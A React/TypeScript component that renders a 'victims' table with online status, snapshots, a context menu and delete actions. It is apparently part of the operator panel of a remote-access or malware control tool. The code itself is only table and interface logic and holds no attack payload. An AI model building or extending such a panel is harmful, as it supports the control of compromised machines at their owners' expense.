import Image from "next/image";
import { useCallback, useEffect, useMemo, useRef, useState, type MouseEvent as ReactMouseEvent } from "react";
import { useQueryClient } from "@tanstack/react-query";
import { flexRender, getCoreRowModel, useReactTable } from "@tanstack/react-table";

import type { Victim } from "../../api/victims";
import { useVictimsTablePrefs } from "./victims-table-prefs-provider";
import { useTableDragScroll } from "./use-table-drag-scroll";
import { VictimsContextMenu } from "./victims-context-menu";
import { useDeleteVictim } from "./use-delete-victim";
import { useVictimsErrorText } from "./use-victims-error-text";
import { useVictimsTableColumns } from "./use-victims-table-columns";
import { cn } from "../../../../lib/utils";
import { victimsColumnSizeClass, type VictimsColumnKey } from "./victims-columns";
import { useVictimsTableColumnReorder } from "./use-victims-table-column-reorder";
import { isVictimOnline } from "../utils/victim-status";

export function VictimsTable(props: {
   victims: Victim[];
   isLoading: boolean;
   isError: boolean;
   error?: unknown;
   selectedVictimId: string | null;
   onSelectVictim: (victimId: string) => void;
   onOpenDetail: (victimId: string) => void;
   onSnapshotVictim?: (victim: Victim) => void;
}) {
   const { victims, isLoading, isError, error, selectedVictimId, onSelectVictim, onOpenDetail, onSnapshotVictim } = props;
   const prefs = useVictimsTablePrefs();

   const qc = useQueryClient();
   const onDeleteVictim = useDeleteVictim(qc);

   const tableContainerRef = useRef<HTMLDivElement | null>(null);
   useTableDragScroll(tableContainerRef);

   const [ctxOpen, setCtxOpen] = useState(false);
   const [ctxDbOpen, setCtxDbOpen] = useState(false);
   const [ctxVictimId, setCtxVictimId] = useState<string>("");
   const [ctxPos, setCtxPos] = useState<{ left: number; top: number } | null>(null);
   const ctxMenuRef = useRef<HTMLDivElement | null>(null);

   const [headerRow, setHeaderRow] = useState<HTMLTableRowElement | null>(null);
   const headerRowRef = useCallback((el: HTMLTableRowElement | null) => {
      setHeaderRow(el);
   }, []);

   useVictimsTableColumnReorder({
      headerRow,
      columnOrder: prefs.columnOrder,
      setColumnOrder: prefs.setColumnOrder,
   });

   const closeCtx = useMemo(
      () => () => {
         setCtxOpen(false);
         setCtxDbOpen(false);
         setCtxVictimId("");
         setCtxPos(null);
      },
      [],
   );

   const onOpenContextMenu = useCallback(
      (e: ReactMouseEvent<HTMLTableRowElement>, victim: Victim, victimId: string) => {
         try {
            e.preventDefault();
            e.stopPropagation();
         } catch {
         }

         const vid = String(victimId || "").trim();
         if (!vid) return;

         try {
            if (onSnapshotVictim) onSnapshotVictim(victim);
         } catch {
         }

         const menuWidth = 160;
         const menuHeight = 40;
         const pad = 4;
         const vw = window.innerWidth || 0;
         const vh = window.innerHeight || 0;

         let x = e.clientX;
         let y = e.clientY;
         if (x + menuWidth > vw) x = Math.max(pad, vw - menuWidth - pad);
         if (y + menuHeight > vh) y = Math.max(pad, vh - menuHeight - pad);

         setCtxVictimId(vid);
         setCtxDbOpen(false);
         setCtxPos({ left: x, top: y });
         setCtxOpen(true);
      },
      [onSnapshotVictim],
   );

   useEffect(() => {
      if (!ctxOpen) return;

      const onDoc = (e: globalThis.MouseEvent) => {
         const t = e.target as Node | null;
         if (!t) {
            closeCtx();
            return;
         }
         const menu = ctxMenuRef.current;
         if (menu && menu.contains(t)) return;
         closeCtx();
      };

      const onKey = (e: globalThis.KeyboardEvent) => {
         if (e.key === "Escape") closeCtx();
      };

      document.addEventListener("mousedown", onDoc);
      document.addEventListener("keydown", onKey);
      return () => {
         document.removeEventListener("mousedown", onDoc);
         document.removeEventListener("keydown", onKey);
      };
   }, [closeCtx, ctxOpen]);

   const columns = useVictimsTableColumns(prefs.columnOrder);

   const table = useReactTable({
      data: victims,
      columns,
      getRowId: (row, index) => {
         const id = String((row as Victim).id ?? "").trim();
         return id || `row-${index}`;
      },
      state: {
         columnOrder: prefs.columnOrder,
         columnVisibility: prefs.columnVisibility,
      },
      onColumnOrderChange: (updater) => {
         try {
            const next = typeof updater === "function" ? updater(prefs.columnOrder) : updater;
            prefs.setColumnOrder(next as VictimsColumnKey[]);
         } catch {
         }
      },
      onColumnVisibilityChange: (updater) => {
         try {
            const prev = prefs.columnVisibility as Record<string, boolean>;
            const next = typeof updater === "function" ? updater(prev) : updater;
            prefs.setColumnVisibility(next as unknown as typeof prefs.columnVisibility);
         } catch {
         }
      },
      getCoreRowModel: getCoreRowModel(),
   });

   const errorText = useVictimsErrorText(isError, error);

   return (
      <div className="h-full w-full min-w-0 overflow-hidden">
         <div ref={tableContainerRef} className="h-full w-full overflow-x-auto overflow-y-auto">
            <div className="inline-block min-w-full align-top">
               <table className="victims-table table-auto w-full min-w-max border-collapse text-[20px] font-[550] leading-[1.05] text-white/[0.99]">
                  <thead>
                     {table.getHeaderGroups().map((hg) => (
                        <tr key={hg.id} ref={hg.id === table.getHeaderGroups()[0]?.id ? headerRowRef : undefined}>
                           {hg.headers.map((h) => {
                              const colId = String(h.column.id) as VictimsColumnKey;
                              return (
                                 <th
                                    key={h.id}
                                    className={cn(
                                       "sticky top-0 z-[2] bg-[rgba(42,42,42,0.86)] px-[4px] pb-[3px] pt-0 text-left text-[20px] font-normal leading-[1.05] text-white/[0.98] shadow-[inset_0_1px_0_rgba(255,255,255,0.10),inset_0_-1px_0_rgba(255,255,255,0.08)]",
                                       "hover:bg-[rgba(42,42,42,0.86)] active:bg-[rgba(42,42,42,0.86)] focus:bg-[rgba(42,42,42,0.86)] focus-within:bg-[rgba(42,42,42,0.86)]",
                                       "outline-none focus:outline-none focus-visible:outline-none",
                                       "select-none whitespace-nowrap",
                                       "isReorderable",
                                       colId,
                                       victimsColumnSizeClass(colId),
                                    )}
                                 >
                                    {h.isPlaceholder ? null : flexRender(h.column.columnDef.header, h.getContext())}
                                 </th>
                              );
                           })}
                        </tr>
                     ))}
                  </thead>
                  <tbody>
                     {isLoading ? (
                        <tr>
                           <td className="py-3 text-sm text-white/80">loading...</td>
                        </tr>
                     ) : isError ? (
                        <tr>
                           <td className="py-3 text-sm text-white/80">{errorText || "failed to load"}</td>
                        </tr>
                     ) : (
                        table.getRowModel().rows.map((row) => {
                           const v = row.original;
                           const id = String(v.id ?? "");
                           const isSelected = id === selectedVictimId;

                           return (
                              <tr
                                 key={row.id}
                                 data-victim-id={id}
                                 className={cn(
                                    "border-b border-white/[0.04]",
                                    "hover:bg-white/[0.03]",
                                    isSelected && "bg-white/[0.04]",
                                 )}
                                 onClick={() => onSelectVictim(id)}
                                 onDoubleClick={() => onOpenDetail(id)}
                                 onContextMenu={(e: ReactMouseEvent<HTMLTableRowElement>) => onOpenContextMenu(e, v, id)}
                              >
                                 {row.getVisibleCells().map((cell) => {
                                    const colId = String(cell.column.id) as VictimsColumnKey;
                                    return (
                                       <td
                                          key={cell.id}
                                          className={cn(colId, victimsColumnSizeClass(colId), "px-[8px] py-[4px] text-left whitespace-nowrap")}
                                       >
                                          {flexRender(cell.column.columnDef.cell, cell.getContext())}
                                       </td>
                                    );
                                 })}
                              </tr>
                           );
                        })
                     )}
                  </tbody>
               </table>

               <VictimsContextMenu
                  open={ctxOpen}
                  pos={ctxPos}
                  menuRef={ctxMenuRef}
                  dbOpen={ctxDbOpen}
                  setDbOpen={setCtxDbOpen}
                  victimId={ctxVictimId}
                  close={closeCtx}
                  onOpenDetail={onOpenDetail}
                  onDeleteVictim={onDeleteVictim}
               />
            </div>
         </div>
      </div>
   );
}